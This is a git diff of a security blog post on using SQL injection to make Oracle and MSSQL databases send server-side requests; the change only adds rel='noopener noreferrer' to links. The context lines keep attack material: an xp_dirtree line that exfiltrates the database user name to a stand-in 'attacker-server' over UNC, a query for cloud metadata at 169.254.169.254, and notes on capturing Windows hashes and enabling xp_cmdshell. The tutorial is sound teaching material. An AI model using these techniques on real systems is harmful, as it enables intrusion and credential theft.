@@ -222,7 +222,7 @@ A `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` shows that the port is closed wh
 
 #### UTL_SMTP
 
-The `UTL_SMTP` package is designed for sending e-mails over SMTP. The example provided on the <a href="https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478" target="_blank">Oracle documentation site shows how you can use this package to send an email</a>. For us, however, the interesting thing is with the ability to provide a host and port specification.
+The `UTL_SMTP` package is designed for sending e-mails over SMTP. The example provided on the <a href="https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478" target="_blank" rel="noopener noreferrer">Oracle documentation site shows how you can use this package to send an email</a>. For us, however, the interesting thing is with the ability to provide a host and port specification.
 
 A crude example is shown below with the `UTL_SMTP.OPEN_CONNECTION` function, with a timeout of 2 seconds
 
@@ -246,9 +246,9 @@ A `ORA-29276: transfer timeout` shows port is open but no SMTP connection was es
 
 #### UTL_TCP
 
-The `UTL_TCP` package and its procedures and functions allow <a href="https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190" target="_blank">TCP/IP based communication with services</a>. If programmed for a specific service, this package can easily become a way into the network or perform full Server Side Requests as all aspects of a TCP/IP connection can be controlled.
+The `UTL_TCP` package and its procedures and functions allow <a href="https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190" target="_blank" rel="noopener noreferrer">TCP/IP based communication with services</a>. If programmed for a specific service, this package can easily become a way into the network or perform full Server Side Requests as all aspects of a TCP/IP connection can be controlled.
 
-The example <a href="https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190" target="_blank">on the Oracle documentation site shows how you can use this package to make a raw TCP connection to fetch a web page</a>. We can simply it a little more and use it to make requests to the metadata instance for example or to an arbitrary TCP/IP service.
+The example <a href="https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190" target="_blank" rel="noopener noreferrer">on the Oracle documentation site shows how you can use this package to make a raw TCP connection to fetch a web page</a>. We can simply it a little more and use it to make requests to the metadata instance for example or to an arbitrary TCP/IP service.
 
 ```sql
 set serveroutput on size 30000;
@@ -318,7 +318,7 @@ select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
 
 A `ORA-12541: TNS:no listener` or a `TNS:operation timed out` is a sign that the TCP port is closed, whereas a `ORA-29263: HTTP protocol error` or data is a sign that the port is open.
 
-Another package I have used in the past with varied success is the <a href="https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705" target="_blank"> `GETCLOB()` method of the `HTTPURITYPE` Oracle abstract type</a> that allows you to interact with a URL and provides support for the HTTP protocol. The `GETCLOB()` method is used to fetch the GET response from a URL as a <a href="https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html" target="_blank">CLOB data type.
+Another package I have used in the past with varied success is the <a href="https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705" target="_blank" rel="noopener noreferrer"> `GETCLOB()` method of the `HTTPURITYPE` Oracle abstract type</a> that allows you to interact with a URL and provides support for the HTTP protocol. The `GETCLOB()` method is used to fetch the GET response from a URL as a <a href="https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html" target="_blank" rel="noopener noreferrer">CLOB data type.
 
 
 ```
@@ -329,7 +329,7 @@ select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclo
 
 ## MSSQL
 
-Microsoft SQL Server provides multiple extended stored procedures that allow you to interact with not only the network but also the file system and even the <a href="https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/" target="_blank">Windows Registry</a>.
+Microsoft SQL Server provides multiple extended stored procedures that allow you to interact with not only the network but also the file system and even the <a href="https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/" target="_blank" rel="noopener noreferrer">Windows Registry</a>.
 
 One technique that keeps coming up is the usage of the undocumented stored procedure `xp_dirtree` that allows you to list the directories in a folder. This stored procedure supports UNC paths, which can be abused to leak Windows credentials over the network or extract data using DNS requests.
 
@@ -341,7 +341,7 @@ Let's look at the above techniques in a little more detail.
 
 ### Limited SSRF using master..xp_dirtree (and other file stored procedures)
 
-The most common method to make a network call you will come across using MSSQL is the usage of the Stored Procedure `xp_dirtree`, which weirdly is undocumented by Microsoft, which caused it to be <a href="https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/" target="_blank">documented by other folks on the Internet</a>. This method has been used in <a href="https://www.notsosecure.com/oob-exploitation-cheatsheet/" target="_blank"> multiple examples</a> of <a href="https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/" target="_blank">Out of Band Data exfiltration</a> posts on the Internet.
+The most common method to make a network call you will come across using MSSQL is the usage of the Stored Procedure `xp_dirtree`, which weirdly is undocumented by Microsoft, which caused it to be <a href="https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/" target="_blank" rel="noopener noreferrer">documented by other folks on the Internet</a>. This method has been used in <a href="https://www.notsosecure.com/oob-exploitation-cheatsheet/" target="_blank" rel="noopener noreferrer"> multiple examples</a> of <a href="https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/" target="_blank" rel="noopener noreferrer">Out of Band Data exfiltration</a> posts on the Internet.
 
 Essentially,
 
@@ -351,15 +351,15 @@ SELECT @user = (SELECT user);
 EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
 ```
 
-Much like MySQL's `LOAD_FILE`, you can use `xp_dirtree` to make a network request to only TCP port 445. You cannot control the port number, but can read information from network shares. Addtionally, much like any UNC path access, <a href="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478" target="_blank">Windows hashes will be sent over to the network that can be captured and replayed for further exploitation</a>.
+Much like MySQL's `LOAD_FILE`, you can use `xp_dirtree` to make a network request to only TCP port 445. You cannot control the port number, but can read information from network shares. Addtionally, much like any UNC path access, <a href="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478" target="_blank" rel="noopener noreferrer">Windows hashes will be sent over to the network that can be captured and replayed for further exploitation</a>.
 
 **PS:** This does not work on `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` running on a `Windows Server 2016 Datacenter` in the default config.
 
-There are other stored procedures <a href="https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx" target="_blank"> like `master..xp_fileexist` </a>etc. as well that can be used for similar results.
+There are other stored procedures <a href="https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx" target="_blank" rel="noopener noreferrer"> like `master..xp_fileexist` </a>etc. as well that can be used for similar results.
 
 ### master..xp_cmdshell
 
-The extended stored procedure <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql" target="_blank">`xp_cmdshell` spawns a Windows command shell and executes the string passed to it, returning any rows of text</a>. This command is run as the SQL Server service account.
+The extended stored procedure <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql" target="_blank" rel="noopener noreferrer">`xp_cmdshell` spawns a Windows command shell and executes the string passed to it, returning any rows of text</a>. This command is run as the SQL Server service account.
 
 `xp_cmdshell` is disabled by default. You can enable it using the SQL Server Configuration Option. Here's how
 
@@ -376,7 +376,7 @@ GO
 
 ![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/13.png)
 
-You could use something like <a href="https://github.com/besimorhino/powercat" target="_blank">PowerCat</a>, download the Windows port of netcat/ncat, <a href="https://livebook.manning.com/book/powershell-deep-dives/chapter-4/9" target="_blank">use raw TCP Client for arbitrary ports</a>, or simply invoke Powershell's `Invoke-WebRequest` to make HTTP requests to perform Server Side queries.
+You could use something like <a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener noreferrer">PowerCat</a>, download the Windows port of netcat/ncat, <a href="https://livebook.manning.com/book/powershell-deep-dives/chapter-4/9" target="_blank" rel="noopener noreferrer">use raw TCP Client for arbitrary ports</a>, or simply invoke Powershell's `Invoke-WebRequest` to make HTTP requests to perform Server Side queries.
 
 ```
 DECLARE @url varchar(max);
@@ -393,9 +393,9 @@ You can additionally pass other headers and change the HTTP method as well to ac
 
 It is fairly straightforward to write a CLR UDF (Common Language Runtime User Defined Function - code written with any of the .NET languages and compiled into a DLL) and load it within MSSQL for custom functions. This, however, requires `dbo` access so may not work unless the web application connection to the database as `sa` or an Administrator role.
 
-<a href="https://github.com/infiniteloopltd/SQLHttp" target="_blank">This Github repo has the Visual Studio project and the installation instructions</a> to load the binary into MSSQL as a CLR assembly and then invoke HTTP GET requests from within MSSQL.
+<a href="https://github.com/infiniteloopltd/SQLHttp" target="_blank" rel="noopener noreferrer">This Github repo has the Visual Studio project and the installation instructions</a> to load the binary into MSSQL as a CLR assembly and then invoke HTTP GET requests from within MSSQL.
 
-The <a href="" target="_blank">`http.cs` code uses the `WebClient` class to make a GET request and fetch the content</a> as specified
+The <a href="" target="_blank" rel="noopener noreferrer">`http.cs` code uses the `WebClient` class to make a GET request and fetch the content</a> as specified
 
 ```code
 using System.Data.SqlTypes;
